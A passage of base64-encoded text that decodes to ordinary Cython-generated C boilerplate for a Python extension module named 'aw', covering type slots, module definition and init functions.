yZXR1cm4gZTsKICB9CiAgaWYgKHAtPl9fcHl4X2dlbmV4cHJfYXJnXzApIHsKICAgIGUgPSAoKnYpKHAtPl9fcHl4X2dlbmV4cHJfYXJnXzAsIGEpOyBpZiAoZSkgcmV0dXJuIGU7CiAgfQogIGlmIChwLT5fX3B5eF92X18pIHsKICAgIGUgPSAoKnYpKHAtPl9fcHl4X3ZfXywgYSk7IGlmIChlKSByZXR1cm4gZTsKICB9CiAgcmV0dXJuIDA7Cn0KI2lmIENZVEhPTl9VU0VfVFlQRV9TUEVDUwpzdGF0aWMgUHlUeXBlX1Nsb3QgX19weXhfdHlwZV8yYXdfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcl9zbG90c1tdID0gewogIHtQeV90cF9kZWFsbG9jLCAodm9pZCAqKV9fcHl4X3RwX2RlYWxsb2NfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHJ9LAogIHtQeV90cF90cmF2ZXJzZSwgKHZvaWQgKilfX3B5eF90cF90cmF2ZXJzZV8yYXdfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcn0sCiAge1B5X3RwX25ldywgKHZvaWQgKilfX3B5eF90cF9uZXdfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHJ9LAogIHswLCAwfSwKfTsKc3RhdGljIFB5VHlwZV9TcGVjIF9fcHl4X3R5cGVfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHJfc3BlYyA9IHsKICAiYXcuX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwciIsCiAgc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIpLAogIDAsCiAgUHlfVFBGTEFHU19ERUZBVUxUfFB5X1RQRkxBR1NfSEFWRV9WRVJTSU9OX1RBR3xQeV9UUEZMQUdTX0NIRUNLVFlQRVN8UHlfVFBGTEFHU19IQVZFX05FV0JVRkZFUnxQeV9UUEZMQUdTX0hBVkVfR0N8UHlfVFBGTEFHU19IQVZFX0ZJTkFMSVpFLAogIF9fcHl4X3R5cGVfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHJfc2xvdHMsCn07CiNlbHNlCgpzdGF0aWMgUHlUeXBlT2JqZWN0IF9fcHl4X3R5cGVfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIgPSB7CiAgUHlWYXJPYmplY3RfSEVBRF9JTklUKDAsIDApCiAgImF3LiIiX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwciIsIAogIHNpemVvZihzdHJ1Y3QgX19weXhfb2JqXzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByKSwgCiAgMCwgCiAgX19weXhfdHBfZGVhbGxvY18yYXdfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwciwgCiAgI2lmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzA4MDBiNAogIDAsIAogICNlbmRpZgogICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDgwMGI0CiAgMCwgCiAgI2VuZGlmCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgUHlfVFBGTEFHU19ERUZBVUxUfFB5X1RQRkxBR1NfSEFWRV9WRVJTSU9OX1RBR3xQeV9UUEZMQUdTX0NIRUNLVFlQRVN8UHlfVFBGTEFHU19IQVZFX05FV0JVRkZFUnxQeV9UUEZMQUdTX0hBVkVfR0N8UHlfVFBGTEFHU19IQVZFX0ZJTkFMSVpFLCAKICAwLCAKICBfX3B5eF90cF90cmF2ZXJzZV8yYXdfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwciwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgI2lmICFDWVRIT05fVVNFX1RZUEVfU1BFQ1MKICAwLCAKICAjZW5kaWYKICAwLCAKICAwLCAKICBfX3B5eF90cF9uZXdfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogICNpZiBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFCiAgMCwgCiAgI2Vsc2UKICBOVUxMLCAKICAjZW5kaWYKICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA4MDBiMSAmJiAoIUNZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSB8fCBQWVBZX1ZFUlNJT05fTlVNID49IDB4MDcwMzA4MDApCiAgMCwgCiAgI2VuZGlmCiAgI2lmIF9fUFlYX05FRURfVFBfUFJJTlRfU0xPVCA9PSAxCiAgMCwgCiAgI2VuZGlmCiAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwMDAKICAwLCAKICAjZW5kaWYKICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDBBNAogIDAsIAogICNlbmRpZgogICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA5MDAwMCAmJiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwYTAwMDAKICAwLCAKICAjZW5kaWYKfTsKI2VuZGlmCgpzdGF0aWMgUHlNZXRob2REZWYgX19weXhfbWV0aG9kc1tdID0gewogIHswLCAwLCAwLCAwfQp9OwoKc3RhdGljIENZVEhPTl9TTUFMTF9DT0RFIGludCBfX1B5eF9Jbml0Q2FjaGVkQnVpbHRpbnMoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKTsgCnN0YXRpYyBDWVRIT05fU01BTExfQ09ERSBpbnQgX19QeXhfSW5pdENhY2hlZENvbnN0YW50cyhfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpOyAKc3RhdGljIENZVEhPTl9TTUFMTF9DT0RFIGludCBfX1B5eF9Jbml0R2xvYmFscyh2b2lkKTsgCnN0YXRpYyBDWVRIT05fU01BTExfQ09ERSBpbnQgX19QeXhfSW5pdENvbnN0YW50cyhfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpOyAKc3RhdGljIENZVEhPTl9TTUFMTF9DT0RFIGludCBfX1B5eF9tb2Rpbml0X2dsb2JhbF9pbml0X2NvZGUoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKTsgCnN0YXRpYyBDWVRIT05fU01BTExfQ09ERSBpbnQgX19QeXhfbW9kaW5pdF92YXJpYWJsZV9leHBvcnRfY29kZShfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpOyAKc3RhdGljIENZVEhPTl9TTUFMTF9DT0RFIGludCBfX1B5eF9tb2Rpbml0X2Z1bmN0aW9uX2V4cG9ydF9jb2RlKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSk7IApzdGF0aWMgQ1lUSE9OX1NNQUxMX0NPREUgaW50IF9fUHl4X21vZGluaXRfdHlwZV9pbml0X2NvZGUoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKTsgCnN0YXRpYyBDWVRIT05fU01BTExfQ09ERSBpbnQgX19QeXhfbW9kaW5pdF90eXBlX2ltcG9ydF9jb2RlKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSk7IApzdGF0aWMgQ1lUSE9OX1NNQUxMX0NPREUgaW50IF9fUHl4X21vZGluaXRfdmFyaWFibGVfaW1wb3J0X2NvZGUoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKTsgCnN0YXRpYyBDWVRIT05fU01BTExfQ09ERSBpbnQgX19QeXhfbW9kaW5pdF9mdW5jdGlvbl9pbXBvcnRfY29kZShfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpOyAKc3RhdGljIENZVEhPTl9TTUFMTF9DT0RFIGludCBfX1B5eF9DcmVhdGVDb2RlT2JqZWN0cyhfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpOyAKCgpzdGF0aWMgaW50IF9fUHl4X21vZGluaXRfZ2xvYmFsX2luaXRfY29kZShfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpIHsKICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucwogIENZVEhPTl9VTlVTRURfVkFSKF9fcHl4X21zdGF0ZSk7CiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoIl9fUHl4X21vZGluaXRfZ2xvYmFsX2luaXRfY29kZSIsIDApOwogIAogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogIHJldHVybiAwOwp9CgpzdGF0aWMgaW50IF9fUHl4X21vZGluaXRfdmFyaWFibGVfZXhwb3J0X2NvZGUoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKSB7CiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnMKICBDWVRIT05fVU5VU0VEX1ZBUihfX3B5eF9tc3RhdGUpOwogIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJfX1B5eF9tb2Rpbml0X3ZhcmlhYmxlX2V4cG9ydF9jb2RlIiwgMCk7CiAgCiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgcmV0dXJuIDA7Cn0KCnN0YXRpYyBpbnQgX19QeXhfbW9kaW5pdF9mdW5jdGlvbl9leHBvcnRfY29kZShfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpIHsKICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucwogIENZVEhPTl9VTlVTRURfVkFSKF9fcHl4X21zdGF0ZSk7CiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoIl9fUHl4X21vZGluaXRfZnVuY3Rpb25fZXhwb3J0X2NvZGUiLCAwKTsKICAKICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gMDsKfQoKc3RhdGljIGludCBfX1B5eF9tb2Rpbml0X3R5cGVfaW5pdF9jb2RlKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSkgewogIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zCiAgQ1lUSE9OX1VOVVNFRF9WQVIoX19weXhfbXN0YXRlKTsKICBpbnQgX19weXhfbGluZW5vID0gMDsKICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7CiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwOwogIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJfX1B5eF9tb2Rpbml0X3R5cGVfaW5pdF9jb2RlIiwgMCk7CiAgCiAgI2lmIENZVEhPTl9VU0VfVFlQRV9TUEVDUwogIF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF9fR2hvc3QgPSAoUHlUeXBlT2JqZWN0ICopIF9fUHl4X1B5VHlwZV9Gcm9tTW9kdWxlQW5kU3BlYyhfX3B5eF9tLCAmX19weXhfdHlwZV8yYXdfX19weXhfc2NvcGVfc3RydWN0X19HaG9zdF9zcGVjLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfX0dob3N0KSkgX19QWVhfRVJSKDAsIDEyMSwgX19weXhfTDFfZXJyb3IpCiAgaWYgKF9fUHl4X2ZpeF91cF9leHRlbnNpb25fdHlwZV9mcm9tX3NwZWMoJl9fcHl4X3R5cGVfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF9fR2hvc3Rfc3BlYywgX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8yYXdfX19weXhfc2NvcGVfc3RydWN0X19HaG9zdCkgPCAoMCkpIF9fUFlYX0VSUigwLCAxMjEsIF9fcHl4X0wxX2Vycm9yKQogICNlbHNlCiAgX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8yYXdfX19weXhfc2NvcGVfc3RydWN0X19HaG9zdCA9ICZfX3B5eF90eXBlXzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfX0dob3N0OwogICNlbmRpZgogICNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICNlbmRpZgogICNpZiAhQ1lUSE9OX1VTRV9UWVBFX1NQRUNTCiAgaWYgKF9fUHl4X1B5VHlwZV9SZWFkeShfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfX0dob3N0KSA8ICgwKSkgX19QWVhfRVJSKDAsIDEyMSwgX19weXhfTDFfZXJyb3IpCiAgI2VuZGlmCiAgI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgaWYgKChDWVRIT05fVVNFX1RZUEVfU0xPVFMgJiYgQ1lUSE9OX1VTRV9QWVRZUEVfTE9PS1VQKSAmJiBsaWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF9fR2hvc3QtPnRwX2RpY3RvZmZzZXQgJiYgX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8yYXdfX19weXhfc2NvcGVfc3RydWN0X19HaG9zdC0+dHBfZ2V0YXR0cm8gPT0gUHlPYmplY3RfR2VuZXJpY0dldEF0dHIpKSB7CiAgICBfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfX0dob3N0LT50cF9nZXRhdHRybyA9IFB5T2JqZWN0X0dlbmVyaWNHZXRBdHRyOwogIH0KICAjZW5kaWYKICAjaWYgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTCiAgX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8yYXdfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwciA9IChQeVR5cGVPYmplY3QgKikgX19QeXhfUHlUeXBlX0Zyb21Nb2R1bGVBbmRTcGVjKF9fcHl4X20sICZfX3B5eF90eXBlXzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByX3NwZWMsIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIpKSBfX1BZWF9FUlIoMCwgMTI0LCBfX3B5eF9MMV9lcnJvcikKICBpZiAoX19QeXhfZml4X3VwX2V4dGVuc2lvbl90eXBlX2Zyb21fc3BlYygmX19weXhfdHlwZV8yYXdfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcl9zcGVjLCBfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEyNCwgX19weXhfTDFfZXJyb3IpCiAgI2Vsc2UKICBfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByID0gJl9fcHl4X3R5cGVfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHI7CiAgI2VuZGlmCiAgI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgI2VuZGlmCiAgI2lmICFDWVRIT05fVVNFX1RZUEVfU1BFQ1MKICBpZiAoX19QeXhfUHlUeXBlX1JlYWR5KF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTI0LCBfX3B5eF9MMV9lcnJvcikKICAjZW5kaWYKICAjaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICBpZiAoKENZVEhPTl9VU0VfVFlQRV9TTE9UUyAmJiBDWVRIT05fVVNFX1BZVFlQRV9MT09LVVApICYmIGxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8yYXdfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwci0+dHBfZGljdG9mZnNldCAmJiBfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByLT50cF9nZXRhdHRybyA9PSBQeU9iamVjdF9HZW5lcmljR2V0QXR0cikpIHsKICAgIF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHItPnRwX2dldGF0dHJvID0gUHlPYmplY3RfR2VuZXJpY0dldEF0dHI7CiAgfQogICNlbmRpZgogICNpZiBDWVRIT05fVVNFX1RZUEVfU1BFQ1MKICBfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByID0gKFB5VHlwZU9iamVjdCAqKSBfX1B5eF9QeVR5cGVfRnJvbU1vZHVsZUFuZFNwZWMoX19weXhfbSwgJl9fcHl4X3R5cGVfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHJfc3BlYywgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8yYXdfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcikpIF9fUFlYX0VSUigwLCAxMjUsIF9fcHl4X0wxX2Vycm9yKQogIGlmIChfX1B5eF9maXhfdXBfZXh0ZW5zaW9uX3R5cGVfZnJvbV9zcGVjKCZfX3B5eF90eXBlXzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByX3NwZWMsIF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTI1LCBfX3B5eF9MMV9lcnJvcikKICAjZWxzZQogIF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIgPSAmX19weXhfdHlwZV8yYXdfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcjsKICAjZW5kaWYKICAjaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAjZW5kaWYKICAjaWYgIUNZVEhPTl9VU0VfVFlQRV9TUEVDUwogIGlmIChfX1B5eF9QeVR5cGVfUmVhZHkoX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8yYXdfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcikgPCAoMCkpIF9fUFlYX0VSUigwLCAxMjUsIF9fcHl4X0wxX2Vycm9yKQogICNlbmRpZgogICNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogIGlmICgoQ1lUSE9OX1VTRV9UWVBFX1NMT1RTICYmIENZVEhPTl9VU0VfUFlUWVBFX0xPT0tVUCkgJiYgbGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByLT50cF9kaWN0b2Zmc2V0ICYmIF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHItPnRwX2dldGF0dHJvID09IFB5T2JqZWN0X0dlbmVyaWNHZXRBdHRyKSkgewogICAgX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8yYXdfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwci0+dHBfZ2V0YXR0cm8gPSBQeU9iamVjdF9HZW5lcmljR2V0QXR0cjsKICB9CiAgI2VuZGlmCiAgI2lmIENZVEhPTl9VU0VfVFlQRV9TUEVDUwogIF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIgPSAoUHlUeXBlT2JqZWN0ICopIF9fUHl4X1B5VHlwZV9Gcm9tTW9kdWxlQW5kU3BlYyhfX3B5eF9tLCAmX19weXhfdHlwZV8yYXdfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcl9zcGVjLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByKSkgX19QWVhfRVJSKDAsIDEyNiwgX19weXhfTDFfZXJyb3IpCiAgaWYgKF9fUHl4X2ZpeF91cF9leHRlbnNpb25fdHlwZV9mcm9tX3NwZWMoJl9fcHl4X3R5cGVfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHJfc3BlYywgX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8yYXdfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcikgPCAoMCkpIF9fUFlYX0VSUigwLCAxMjYsIF9fcHl4X0wxX2Vycm9yKQogICNlbHNlCiAgX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8yYXdfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwciA9ICZfX3B5eF90eXBlXzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByOwogICNlbmRpZgogICNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICNlbmRpZgogICNpZiAhQ1lUSE9OX1VTRV9UWVBFX1NQRUNTCiAgaWYgKF9fUHl4X1B5VHlwZV9SZWFkeShfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEyNiwgX19weXhfTDFfZXJyb3IpCiAgI2VuZGlmCiAgI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgaWYgKChDWVRIT05fVVNFX1RZUEVfU0xPVFMgJiYgQ1lUSE9OX1VTRV9QWVRZUEVfTE9PS1VQKSAmJiBsaWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHItPnRwX2RpY3RvZmZzZXQgJiYgX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8yYXdfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwci0+dHBfZ2V0YXR0cm8gPT0gUHlPYmplY3RfR2VuZXJpY0dldEF0dHIpKSB7CiAgICBfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByLT50cF9nZXRhdHRybyA9IFB5T2JqZWN0X0dlbmVyaWNHZXRBdHRyOwogIH0KICAjZW5kaWYKICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gMDsKICBfX3B5eF9MMV9lcnJvcjo7CiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgcmV0dXJuIC0xOwp9CgpzdGF0aWMgaW50IF9fUHl4X21vZGluaXRfdHlwZV9pbXBvcnRfY29kZShfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpIHsKICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucwogIENZVEhPTl9VTlVTRURfVkFSKF9fcHl4X21zdGF0ZSk7CiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoIl9fUHl4X21vZGluaXRfdHlwZV9pbXBvcnRfY29kZSIsIDApOwogIAogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogIHJldHVybiAwOwp9CgpzdGF0aWMgaW50IF9fUHl4X21vZGluaXRfdmFyaWFibGVfaW1wb3J0X2NvZGUoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKSB7CiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnMKICBDWVRIT05fVU5VU0VEX1ZBUihfX3B5eF9tc3RhdGUpOwogIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJfX1B5eF9tb2Rpbml0X3ZhcmlhYmxlX2ltcG9ydF9jb2RlIiwgMCk7CiAgCiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgcmV0dXJuIDA7Cn0KCnN0YXRpYyBpbnQgX19QeXhfbW9kaW5pdF9mdW5jdGlvbl9pbXBvcnRfY29kZShfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpIHsKICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucwogIENZVEhPTl9VTlVTRURfVkFSKF9fcHl4X21zdGF0ZSk7CiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoIl9fUHl4X21vZGluaXRfZnVuY3Rpb25faW1wb3J0X2NvZGUiLCAwKTsKICAKICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gMDsKfQoKI2lmIENZVEhPTl9QRVA0ODlfTVVMVElfUEhBU0VfSU5JVApzdGF0aWMgUHlPYmplY3QqIF9fcHl4X3B5bW9kX2NyZWF0ZShQeU9iamVjdCAqc3BlYywgUHlNb2R1bGVEZWYgKmRlZik7IApzdGF0aWMgaW50IF9fcHl4X3B5bW9kX2V4ZWNfYXcoUHlPYmplY3QqIG1vZHVsZSk7IApzdGF0aWMgUHlNb2R1bGVEZWZfU2xvdCBfX3B5eF9tb2R1bGVkZWZfc2xvdHNbXSA9IHsKICB7UHlfbW9kX2NyZWF0ZSwgKHZvaWQqKV9fcHl4X3B5bW9kX2NyZWF0ZX0sCiAge1B5X21vZF9leGVjLCAodm9pZCopX19weXhfcHltb2RfZXhlY19hd30sCiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HCiAge1B5X21vZF9naWwsIFB5X01PRF9HSUxfVVNFRH0sCiAgI2VuZGlmCiAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwMDAgJiYgQ1lUSE9OX1VTRV9NT0RVTEVfU1RBVEUKICB7UHlfbW9kX211bHRpcGxlX2ludGVycHJldGVycywgUHlfTU9EX01VTFRJUExFX0lOVEVSUFJFVEVSU19OT1RfU1VQUE9SVEVEfSwKICAjZW5kaWYKICB7MCwgTlVMTH0KfTsKI2VuZGlmCgojaWZkZWYgX19jcGx1c3BsdXMKbmFtZXNwYWNlIHsKICBzdHJ1Y3QgUHlNb2R1bGVEZWYgX19weXhfbW9kdWxlZGVmID0KICAjZWxzZQogIHN0YXRpYyBzdHJ1Y3QgUHlNb2R1bGVEZWYgX19weXhfbW9kdWxlZGVmID0KICAjZW5kaWYKICB7CiAgICAgIFB5TW9kdWxlRGVmX0hFQURfSU5JVCwKICAgICAgImF3IiwKICAgICAgMCwgCiAgICAjaWYgQ1lUSE9OX1VTRV9NT0RVTEVfU1RBVEUKICAgICAgc2l6ZW9mKF9fcHl4X21zdGF0ZXR5cGUpLCAKICAgICNlbHNlCiAgICAgIChDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVQpID8gMCA6IC0xLCAKICAgICNlbmRpZgogICAgICBfX3B5eF9tZXRob2RzICwKICAgICNpZiBDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVQKICAgICAgX19weXhfbW9kdWxlZGVmX3Nsb3RzLCAKICAgICNlbHNlCiAgICAgIE5VTEwsIAogICAgI2VuZGlmCiAgICAjaWYgQ1lUSE9OX1VTRV9NT0RVTEVfU1RBVEUKICAgICAgX19weXhfbV90cmF2ZXJzZSwgCiAgICAgIF9fcHl4X21fY2xlYXIsIAogICAgICBOVUxMIAogICAgI2Vsc2UKICAgICAgTlVMTCwgCiAgICAgIE5VTEwsIAogICAgICBOVUxMIAogICAgI2VuZGlmCiAgfTsKICAjaWZkZWYgX19jcGx1c3BsdXMKfSAKI2VuZGlmCgoKI2lmbmRlZiBDWVRIT05fTk9fUFlJTklUX0VYUE9SVAogICNkZWZpbmUgX19QeXhfUHlNT0RJTklUX0ZVTkMgUHlNT0RJTklUX0ZVTkMKI2Vsc2UKICAjaWZkZWYgX19jcGx1c3BsdXMKICAjZGVmaW5lIF9fUHl4X1B5TU9ESU5JVF9GVU5DIGV4dGVybiAiQyIgUHlPYmplY3QgKgogICNlbHNlCiAgI2RlZmluZSBfX1B5eF9QeU1PRElOSVRfRlVOQyBQeU9iamVjdCAqCiAgI2VuZGlmCiNlbmRpZgoKX19QeXhfUHlNT0RJTklUX0ZVTkMgUHlJbml0X2F3KHZvaWQpIENZVEhPTl9TTUFMTF9DT0RFOyAKX19QeXhfUHlNT0RJTklUX0ZVTkMgUHlJbml0X2F3KHZvaWQpCiNpZiBDWVRI